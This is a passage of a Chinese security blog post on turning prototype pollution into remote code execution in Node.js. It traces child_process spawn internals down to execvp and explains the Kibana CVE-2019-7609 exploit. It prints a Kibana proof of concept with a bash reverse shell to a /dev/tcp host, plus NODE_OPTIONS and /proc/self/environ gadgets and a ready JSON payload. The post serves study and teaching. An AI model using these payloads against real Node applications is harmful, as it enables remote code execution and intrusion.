+  <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token operator">===</span> <span class="token constant">UV_EACCES</span> <span class="token operator">||</span>
+      err <span class="token operator">===</span> <span class="token constant">UV_EAGAIN</span> <span class="token operator">||</span>
+      err <span class="token operator">===</span> <span class="token constant">UV_EMFILE</span> <span class="token operator">||</span>
+      err <span class="token operator">===</span> <span class="token constant">UV_ENFILE</span> <span class="token operator">||</span>
+      err <span class="token operator">===</span> <span class="token constant">UV_ENOENT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span>onErrorNT<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// There is no point in continuing when we've hit EMFILE or ENFILE</span>
+    <span class="token comment">// because we won't be able to set up the stdio file descriptors.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token operator">===</span> <span class="token constant">UV_EMFILE</span> <span class="token operator">||</span> err <span class="token operator">===</span> <span class="token constant">UV_ENFILE</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span> err<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// Close all opened fds on error</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> stdio<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> stream <span class="token operator">=</span> stdio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'pipe'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        stream<span class="token punctuation">.</span>handle<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">this</span><span class="token punctuation">.</span>_handle<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>_handle <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">throw</span> <span class="token function">errnoException</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token string">'spawn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span>onSpawnNT<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_handle<span class="token punctuation">.</span>pid<span class="token punctuation">;</span>
+
+  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> stdio<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> stream <span class="token operator">=</span> stdio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>ipc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">this</span><span class="token punctuation">.</span>_closesNeeded<span class="token operator">++</span><span class="token punctuation">;</span>
+      <span class="token keyword">continue</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// The stream is already cloned and piped, thus stop its readable side,</span>
+    <span class="token comment">// otherwise we might attempt to read from the stream when at the same time</span>
+    <span class="token comment">// the child process does.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'wrap'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      stream<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>reading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+      stream<span class="token punctuation">.</span>handle<span class="token punctuation">.</span><span class="token function">readStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      stream<span class="token punctuation">.</span>_stdio<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      stream<span class="token punctuation">.</span>_stdio<span class="token punctuation">.</span>readableFlowing <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+      stream<span class="token punctuation">.</span>_stdio<span class="token punctuation">.</span>_readableState<span class="token punctuation">.</span>reading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+      stream<span class="token punctuation">.</span>_stdio<span class="token punctuation">[</span>kIsUsedAsStdio<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+      <span class="token keyword">continue</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>handle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      stream<span class="token punctuation">.</span>socket <span class="token operator">=</span> <span class="token function">createSocket</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">!==</span> <span class="token number">0</span> <span class="token operator">?</span>
+        stream<span class="token punctuation">.</span>handle <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>_closesNeeded<span class="token operator">++</span><span class="token punctuation">;</span>
+        stream<span class="token punctuation">.</span>socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'close'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+          <span class="token function">maybeClose</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">this</span><span class="token punctuation">.</span>stdin <span class="token operator">=</span> stdio<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> stdio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">?</span>
+    stdio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>stdout <span class="token operator">=</span> stdio<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> stdio<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">?</span>
+    stdio<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>stderr <span class="token operator">=</span> stdio<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> stdio<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">?</span>
+    stdio<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">this</span><span class="token punctuation">.</span>stdio <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> stdio<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token function">ArrayPrototypePush</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stdio<span class="token punctuation">,</span>
+                       stdio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>socket <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> stdio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// Add .send() method and start listening for IPC data</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>ipc <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token function">setupChannel</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> ipc<span class="token punctuation">,</span> serialization<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">return</span> err<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中的<code>this._handle.spawn</code>调用了 process_wrap.cc 的 spawn 来生成子进程：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/82dab76d63e6f3592e15e49d7dba2367044d4869/src/process_wrap.cc#L153">https://github.com/nodejs/node/blob/82dab76d63e6f3592e15e49d7dba2367044d4869/src/process_wrap.cc#L153</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Spawn</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">const</span> FunctionCallbackInfo<span class="token operator">&lt;</span>Value<span class="token operator">></span><span class="token operator">&amp;</span> args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">//获取js传过来的第一个option参数</span>
+    Local<span class="token operator">&lt;</span>Object<span class="token operator">></span> js_options <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ToObject</span><span class="token punctuation">(</span>env<span class="token operator">-</span><span class="token operator">></span><span class="token function">context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToLocalChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token operator">...</span>
+    <span class="token comment">// options.env</span>
+    Local<span class="token operator">&lt;</span>Value<span class="token operator">></span> env_v <span class="token operator">=</span>
+        js_options<span class="token operator">-</span><span class="token operator">></span><span class="token function">Get</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> env<span class="token operator">-</span><span class="token operator">></span><span class="token function">env_pairs_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToLocalChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>env_v<span class="token punctuation">.</span><span class="token function">IsEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> env_v<span class="token operator">-</span><span class="token operator">></span><span class="token function">IsArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      Local<span class="token operator">&lt;</span>Array<span class="token operator">></span> env_opt <span class="token operator">=</span> Local<span class="token operator">&lt;</span>Array<span class="token operator">></span><span class="token operator">:</span><span class="token operator">:</span><span class="token function">Cast</span><span class="token punctuation">(</span>env_v<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      int envc <span class="token operator">=</span> env_opt<span class="token operator">-</span><span class="token operator">></span><span class="token function">Length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token constant">CHECK_GT</span><span class="token punctuation">(</span>envc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Check for overflow.</span>
+      options<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token operator">*</span><span class="token punctuation">[</span>envc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// Heap allocated to detect errors.</span>
+      <span class="token keyword">for</span> <span class="token punctuation">(</span>int i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> envc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">node</span><span class="token operator">:</span><span class="token operator">:</span>Utf8Value <span class="token function">pair</span><span class="token punctuation">(</span>env<span class="token operator">-</span><span class="token operator">></span><span class="token function">isolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                             env_opt<span class="token operator">-</span><span class="token operator">></span><span class="token function">Get</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToLocalChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        options<span class="token punctuation">.</span>env<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span><span class="token operator">*</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token constant">CHECK_NOT_NULL</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>env<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      options<span class="token punctuation">.</span>env<span class="token punctuation">[</span>envc<span class="token punctuation">]</span> <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token operator">...</span>
+
+    <span class="token comment">//调用uv_spawn生成子进程，并将父进程的event_loop传递过去</span>
+    int err <span class="token operator">=</span> <span class="token function">uv_spawn</span><span class="token punctuation">(</span>env<span class="token operator">-</span><span class="token operator">></span><span class="token function">event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>wrap<span class="token operator">-</span><span class="token operator">></span>process_<span class="token punctuation">,</span> <span class="token operator">&amp;</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//省略</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>代码只截取了对 env 这个属性的操作，它将原先的 envPairs 进行封装。最后所有 options 带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的 fork()、waitpid() 来控制进程的产生和资源释放，不过有一个非常重要的实现如下：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//process.cc->uv_spawn()</span>
+
+<span class="token function">execvp</span><span class="token punctuation">(</span>options<span class="token operator">-</span><span class="token operator">></span>file<span class="token punctuation">,</span> options<span class="token operator">-</span><span class="token operator">></span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>使用了 execvp 来执行任务，这里的 options-&gt;file 就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则 options-&gt;args 与之对应。</p>
+<hr>
+<h1 id="Kibana-RCE（CVE-2019-7609）"><a href="#Kibana-RCE（CVE-2019-7609）" class="headerlink" title="Kibana-RCE（CVE-2019-7609）"></a>Kibana-RCE（CVE-2019-7609）</h1><p>node的官方文档中能找到用例：<a target="_blank" rel="noopener" href="https://nodejs.org/api/cli.html#cli_node_options_options">https://nodejs.org/api/cli.html#cli_node_options_options</a></p>
+<p>node &gt; v8.0.0 支持运行node时增加一个命令行参数<code>NODE_OPTIONS</code>，它能够包含一个js脚本，相当于include</p>
+<p>在node进程启动的时候会作为环境变量加载</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">'--require ./evil.js'</span> <span class="token function">node</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011173250328.png" alt="image-20241011173250328"></p>
+<p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句，当然了这需要 bash 来export</p>
+<p>不过上面打印 process.env 也显示出一件事，只需要污染 process.env 即可rce，于是有了Kibana的poc：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.es<span class="token punctuation">(</span>*<span class="token punctuation">)</span>.props<span class="token punctuation">(</span>label.__proto__.env.AAAA<span class="token operator">=</span><span class="token string">'require("child_process").exec("bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1");process.exit()//'</span><span class="token punctuation">)</span>
+.props<span class="token punctuation">(</span>label.__proto__.env.NODE_OPTIONS<span class="token operator">=</span><span class="token string">'--require /proc/self/environ'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>node运行时会把当前进程的 env 写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code></p>
+<p>通过污染 env 把恶意的语句写进 &#x2F;proc&#x2F;self&#x2F;environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">AAAA</span><span class="token operator">=</span><span class="token string">'console.log(123)//'</span> <span class="token assign-left variable">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">'--require /proc/self/environ'</span> <span class="token function">node</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011174458613.png" alt="image-20241011174458613"></p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011173851168.png" alt="image-20241011173851168"></p>
+<p>污染了 Object.env 之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p>
+<br>
+
+<p>由于我们这篇文章的重心是pp2rce，Kibana部分的源码就不搞了，看看图得了（</p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011175635060.png" alt="image-20241011175635060"></p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011175645794.png" alt="image-20241011175645794"></p>
+<p>需要知道的是<code>fork()</code>和<code>spawn(&#39;whoami&#39;)</code>的差别，虽然 fork 调用了 spawn 来实现的子进程创建</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">exports<span class="token punctuation">.</span><span class="token function-variable function">fork</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>modulePath <span class="token comment">/*, args, options*/</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token operator">...</span><span class="token comment">//省略</span>
+    options<span class="token punctuation">.</span>execPath <span class="token operator">=</span> options<span class="token punctuation">.</span>execPath <span class="token operator">||</span> process<span class="token punctuation">.</span>execPath<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">spawn</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>execPath<span class="token punctuation">,</span> args<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>它处理了 execPath 这个属性，默认获取系统变量的 process.execPath ，再传入spawn，这里是<code>node</code></p>
+<p>而使用 spawn 处理的时候，得到的file是我们传入的参数<code>whoami</code></p>
+<p>上面分析过，child_process 在子进程创建的最底层，会调用 execvp 执行命令执行file</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">execvp</span><span class="token punctuation">(</span>options<span class="token operator">-</span><span class="token operator">></span>file<span class="token punctuation">,</span> options<span class="token operator">-</span><span class="token operator">></span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>而上面poc的核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入</p>
+<p>而直接调用spawn函数时必须有file值，这也造成了直接跑<code>spawn(&#39;whoami&#39;)</code>无法加载 evil.js 的情况</p>
+<p>所以最终的poc是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// test.js</span>
+proc <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> aa <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+aa<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'AAAA'</span><span class="token operator">:</span><span class="token string">'console.log(123)//'</span><span class="token punctuation">,</span><span class="token string-property property">'NODE_OPTIONS'</span><span class="token operator">:</span><span class="token string">'--require /proc/self/environ'</span><span class="token punctuation">&#125;</span>
+proc<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./function.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//function.js</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this is func'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个trick如果要用 fork 进行 rce 的话要求我们能够可控一个文件的内容</p>
+<br>
+
+<p>经过测试<code>exec</code>、<code>execFile</code>函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入 options 选项，这两个命令也会默认定义options，这也是 child_process 防止命令执行的一种途径</p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011222634908.png" alt="image-20241011222634908"></p>
+<p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使 shell&#x3D;&#x3D;&#x3D;false 或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程</p>
+<hr>
+<h1 id="PP2RCE（Prototype-Pollution-to-RCE）"><a href="#PP2RCE（Prototype-Pollution-to-RCE）" class="headerlink" title="PP2RCE（Prototype Pollution to RCE）"></a>PP2RCE（Prototype Pollution to RCE）</h1><h2 id="通过环境变量"><a href="#通过环境变量" class="headerlink" title="通过环境变量"></a>通过环境变量</h2><p>原理就是上面的 Kibana-RCE</p>
+<p>为了让 &#x2F;proc&#x2F;self&#x2F;environ 开头就是我们的恶意js代码，EVIL 的部分必须放在最开始</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> execSync<span class="token punctuation">,</span> fork <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Manual Pollution</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"EVIL"</span><span class="token operator">:</span><span class="token string">"console.log(require('child_process').execSync('cat /proc/self/environ>pp2rce.txt').toString())//"</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/environ"</span>
+
+<span class="token comment">// Trigger gadget</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./evil.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// This should create the file pp2rce.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241011225507262.png" alt="image-20241011225507262"></p>
+<p>可以看到这里实际rce的就是执行了<code>node /proc/self/environ</code></p>
+<p>json速抄：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">,</span> <span class="token property">"env"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"EVIL"</span><span class="token operator">:</span><span class="token string">"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="via-env-vars-cmdline"><a href="#via-env-vars-cmdline" class="headerlink" title="via env vars + cmdline"></a>via env vars + cmdline</h2><p>不知道从哪个版本开始，nodejs会始终将<code>NODE_OPTIONS</code>放在 <code>environ</code> 文件中的首位，于是就有了这个方法</p>
+<p> <code>spawn()</code> 函数还有另外两个选项：<code>argv0</code> 和 <code>shell</code></p>
+<ul>
+<li>argv0：控制传递给新进程的参数列表中的第一个元素，相当于执行命令，而所有的参数都会出现在文件 <code>/proc/self/cmdline</code> 中，因此第一个元素将位于开头</li>
+</ul>
+<p>那么我们可以尝试把 <code>NODE_OPTIONS</code> 的值更改为 <code>--require /proc/self/cmdline</code>，并且把 payload 写入 argv0</p>
